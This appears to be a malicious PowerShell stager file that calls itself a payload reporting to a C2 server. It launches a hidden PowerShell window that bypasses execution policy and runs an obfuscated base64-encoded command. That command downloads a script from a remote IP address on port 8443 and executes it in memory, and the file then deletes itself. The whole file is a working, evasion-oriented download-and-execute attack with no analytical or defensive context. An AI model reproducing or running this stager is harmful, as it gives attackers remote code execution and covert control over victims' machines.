# payload.ps1

# Collect system information
# Send the collected information to the C2 server
powershell.exe -nol -w 1 -nop -ep bypass -enc IABzAEUAVAAtAEkAVABlAE0AIAAoACIAdgAiACsAIgBBACIAKwAiAHIASQBhAEIAbABlADoAcAA5AE8AdwBmACIAKQAgACAAKAAgAFsAVAB5AFAARQBdACgAIgB7ADAAfQB7ADMAfQB7ADUAfQB7ADQAfQB7ADIAfQB7ADEAfQAiAC0ARgAnAG4AZQBUAC4AJwAsACcARQAnACwAJwBJAEEAbABDAGEAYwBoACcALAAnAEMAcgAnACwAJwBkAEUATgB0ACcALAAnAEUAJwApACAAKQAgACAAOwAgACgAJgAoACIAewAwAH0AewAzAH0AewAxAH0AewAyAH0AIgAgAC0AZgAgACcATgBlAHcALQAnACwAJwBiAGoAJwAsACcAZQBjAHQAJwAsACcATwAnACkAIAAoACIAewAzAH0AewAyAH0AewA0AH0AewAxAH0AewAwAH0AIgAtAGYAIAAnAGkAZQBuAHQAJwAsACcAbAAnACwAJwB0AC4AVwBlAGIAJwAsACcATgBlACcALAAnAEMAJwApACkALgAiAHAAUgBPAGAAWAB5ACIALgAiAEMAUgBlAEQAYABlAE4AVABgAGkAYABBAEwAcwAiAD0AIAAgACgAIABMAHMAIAAgACgAIgB2ACIAKwAiAEEAIgArACIAcgBpAEEAQgBMAEUAOgBQADkAbwB3AEYAIgApACAAIAApAC4AIgBWAGEAbABgAFUAZQAiADoAOgAiAGQAZQBgAEYAYQB1AEwAYABUAE4ARQBUAFcATwBSAGsAQwBgAFIARQBEAEUATgB0AGkAYABBAGAAbABTACIAOwAuACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACcAaQB3ACcALAAnAHIAJwApACgAKAAiAHsANAB9AHsAMwB9AHsAMQB9AHsAMAB9AHsAOAB9AHsAMgB9AHsANwB9AHsANgB9AHsANQB9ACIALQBmACcAMQAnACwAJwAzADEALgAzADkALgAnACwAJwBhAGQALwBwACcALAAnADIALgAnACwAJwBoAHQAdABwADoALwAvADEANwAnACwAJwBlAHIAcwBoAGUAbABsAC8AJwAsACcAdwAnACwAJwBvACcALAAnADYANgA6ADgANAA0ADMALwBkAG8AdwBuAGwAbwAnACkAKQAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAHwALgAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAnAGkAJwAsACcAZQB4ACcAKQA=
timeout /t 1 > nul
del "%~f0"    
